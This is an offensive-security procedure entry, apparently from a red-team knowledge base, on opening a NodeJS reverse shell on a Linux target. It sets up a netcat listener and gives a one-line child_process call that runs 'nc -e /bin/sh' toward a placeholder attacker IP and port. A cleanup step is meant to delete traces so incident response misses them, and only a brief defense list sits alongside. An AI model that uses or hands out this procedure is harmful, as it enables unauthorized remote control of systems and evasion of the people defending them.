---
type: procedure
description: >-
  Establishes a reverse shell on a target system using NodeJS scripts to connect
  back to the attacker's listener.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - nodejs
  - reverse-shell
  - execution
commands:
  - '[[commands/netcat-tcp-listener]]'
platforms:
  - Linux
tools:
  - '[[tools/NodeJS]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Establish-NodeJS-Reverse-Shell

## Summary

This procedure demonstrates how to establish a reverse shell on a Linux target system with NodeJS installed by executing JavaScript code that connects back to an attacker-controlled listener, allowing remote command execution.

## Description

A NodeJS reverse shell leverages the NodeJS runtime environment on the target to create a TCP connection back to the attacker's machine. Once connected, the shell process pipes input/output to the socket, enabling the attacker to run commands remotely. This is useful in post-exploitation scenarios where NodeJS is available but traditional tools like netcat may be absent or restricted. The technique relies on NodeJS modules such as 'net' for socket handling and 'child_process' for spawning shells. It maps to MITRE ATT&CK Execution tactic via JavaScript interpreter usage and assumes the attacker has code execution capability on the target, such as through a web shell or compromised application.

## Requirements

1. NodeJS installed on the target system (version 6+ recommended for module compatibility).
2. Ability to execute JavaScript code on the target (e.g., via file upload, eval in a web app, or direct node invocation).
3. Network access from target to attacker machine on the specified port.
4. Attacker machine with netcat or similar listener tool.

## Defense

- Monitor for unexpected outbound TCP connections from NodeJS processes to unusual IPs/ports.
- Implement application whitelisting to restrict NodeJS execution or module loading.
- Enable NodeJS logging and inspect for suspicious child_process spawns or net module usage.
- Use network segmentation and firewalls to block lateral movement connections.

## Objectives

1. Establish a persistent TCP connection from target to attacker listener.
2. Spawn an interactive shell on the target for remote command execution.
3. Maintain access for further post-exploitation activities like lateral movement.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Start a TCP listener on the attacker side to receive the incoming connection from the target. This uses netcat to handle the shell interaction.

**Command** ([[commands/netcat-tcp-listener]]):
```bash
nc -lvnp $_ATTACKER_PORT
```

> This command binds to the specified port and listens for verbose connections. Replace $_ATTACKER_PORT with your chosen port (e.g., 4242). Expected output includes a message like "Listening on [0.0.0.0] (family 0, port $_ATTACKER_PORT)" once ready.

### Step 2: Prepare and Execute NodeJS Reverse Shell Code on Target

**Context**: Transfer and run one of the NodeJS code snippets on the target to initiate the connection. Choose based on evasion needs; the net socket method is more stealthy as it avoids external tools like netcat.

Use [[codes/NodeJS-Net-Socket-Reverse-Shell]] for a pure NodeJS implementation:

Save the code to a file (e.g., shell.js) on the target, then execute with `node shell.js`, substituting the IP and port.

Alternatively, for simpler execution if netcat is available on target, inline this variation:
```javascript
require('child_process').exec('nc -e /bin/sh $_ATTACKER_IP $_ATTACKER_PORT');
```

> Run the code via node or eval if in a JS context. Expected output on attacker listener: A shell prompt (e.g., "$ ") indicating connection success. If using the exec variation, ensure netcat supports -e flag; otherwise, it may fail.

### Step 3: Verify and Interact with the Shell

**Context**: Confirm the reverse shell is active by sending test commands and checking for output. Handle any stability issues like connection drops.

Once connected, type commands like `whoami` or `id` in the listener.

> Expected output: Responses from the target shell, such as user details or directory listings. Success is indicated by interactive command execution without errors. If the connection drops, re-execute the code on target.

### Step 4: Cleanup and Evasion (Optional)

**Context**: Remove traces of the executed code to avoid detection during incident response.

Delete the script file with `rm shell.js` via the shell, and monitor for any logged NodeJS activity.
